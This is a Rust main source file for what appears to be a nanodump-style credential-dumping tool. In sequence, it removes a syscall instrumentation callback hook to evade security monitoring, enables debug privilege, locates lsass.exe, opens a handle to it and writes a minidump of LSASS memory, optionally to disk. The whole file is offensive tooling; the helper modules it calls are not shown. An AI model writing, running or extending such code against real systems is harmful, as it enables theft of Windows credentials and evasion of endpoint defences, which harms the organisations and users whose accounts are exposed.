extern crate alloc;

mod utils;
mod core;
mod cli;
mod syscall;

use crate::cli::parser::parse_args;
use crate::core::handle::obtain::open_handle_to_lsass;
use crate::core::permission::get_lsass_min_permissions;
use crate::core::token::privilege::{enable_debug_privilege, is_debug_privilege_enabled};
use crate::core::process::get_pid_by_name_nt;
use crate::core::dump::nanodump::nano_dump_write_dump;
use crate::core::process_instrumentation_callback::remove_syscall_callback_hook;
use crate::utils::utils::{get_full_path, write_buffer};
use log::{debug, error, info};
use core::dump::model::{DumpContext, MINIDUMP_IMPL_VERSION, MINIDUMP_SIGNATURE, MINIDUMP_VERSION};
use std::process::exit;
use crate::cli::banner::build_header;
use crate::core::dump::model::DumpError;

fn main() {
    let args = parse_args();

    let log_level = if args.quiet {
        log::LevelFilter::Off
    } else {
        match args.verbose {
            0 => log::LevelFilter::Info,
            1 => log::LevelFilter::Debug,
            2 => log::LevelFilter::Trace,
            _ => log::LevelFilter::Trace,
        }
    };

    env_logger::Builder::from_default_env().filter_level(log_level).init();

    info!("{}",build_header());

    debug!("========== PARAMETERS ==========");

    debug!("get-pid           : {}", args.lsass_pid);
    debug!("get_pid_and_leave : {}", args.get_pid_and_leave);
    debug!("verbosity         : {}", args.verbose);
    debug!("quiet             : {}", args.quiet);
    debug!("write_dump_to_disk: {}", args.write_dump_to_disk);
    debug!("path              : {}", args.path);

    debug!("======== END PARAMETERS =========\n");

    if args.write_dump_to_disk {
        debug!("========== CREATE OUTPUT FILE ==========");

        let full_path = get_full_path(args.path.as_str());
        match full_path {
            Ok(path) => {

            }
            Err(e) => {
                error!("{}", e);
                return;
            }

        }

        debug!("======== END CREATE OUTPUT FILE ========");
    }


    debug!("========== REMOVING CALLBACK HOOK ==========");
    info!("Trying to remove callback hook...");
    if remove_syscall_callback_hook(){
        info!("  -> Callback hook successfully removed");
    }
    else {
        error!("Failed to remove syscall hook");
    }
    debug!("======== END REMOVING CALLBACK HOOK ========\n");

    debug!("========== ENABLING DEBUG PRIVILEGES ==========");
    info!("Trying to enable debug privileges...");
    
    if enable_debug_privilege() {
        info!("  -> Debug privilege successfully enabled");
    } else {
        error!("Debug privilege not enabled");
        exit(1)
    }
    debug!("======== END DEBUG PRIVILEGES ========\n");

    debug!("========== LSASS PID ==========");
    info!("Trying to obtain lsass pid...");

    let lsass_pid: Option<usize>;

    if args.lsass_pid == 0{
        info!("  -> Searching pid by name lsass.exe");
        lsass_pid = get_pid_by_name_nt("lsass.exe");
        if lsass_pid.is_none() {
            error!("Error: Unable to find core");
            exit(1);
        }
    }
    else {
        info!("  -> pid provided by user");
        lsass_pid = Some(args.lsass_pid as usize);
    }
    let lsass_pid = lsass_pid.unwrap() as u32;
    info!("    -> LSASS core ID: {}", lsass_pid);
    if args.get_pid_and_leave{
        debug!("Ending core due to get_pid_and_leave...");
        return;
    }
    debug!("======== END LSASS PID ==========\n");

    debug!("========== LSASS PERMISSION ==========");
    let permission = get_lsass_min_permissions();
    debug!("Permission: {}", permission);
    debug!("======== END LSASS PERMISSION ========\n");

    debug!("========== LSASS HANDLE ==========");
    info!("Trying to obtain lsass handle...");
    let h_process = open_handle_to_lsass(lsass_pid, false, permission, 0);
    if h_process.is_none(){
        error!("  -> Unable to obtain handle");
        exit(1);
    }
    let h_process = h_process.unwrap();
    info!("  -> Lsass handle successfully obtained");
    debug!("======== END LSASS HANDLE ========\n");

    debug!("========== DUMPING MEMORY ==========");
    info!("Trying to dump memory...");

    let mut dc : DumpContext = DumpContext {
        h_process,
        base_address : std::ptr::null_mut(),
        rva :0,
        dump_max_size : 0x0c800000,
        signature : MINIDUMP_SIGNATURE,
        version : MINIDUMP_VERSION,
        implementation_version : MINIDUMP_IMPL_VERSION,
        buf : Vec::new(),
    };


    match nano_dump_write_dump(&mut dc) {
        Ok(_) => {
            if args.write_dump_to_disk {
                info!("  -> Writing dump at {}", args.path);
                if let Err(e) = write_buffer(&*args.path, &dc.buf) {
                    error!("Failed to write buffer to disk: {}", e);
                }
            }
            info!("Memory dumped successfully");
        }
        Err(e) => match e {
            DumpError::Io(io_err) => error!("I/O error during dump: {}", io_err),
            DumpError::InvalidState => error!("Cannot dump memory: invalid state"),
            DumpError::WriteFailed => error!("Memory dump failed while writing"),
        },
    }
    debug!("======== END DUMPING MEMORY ========\n")

}


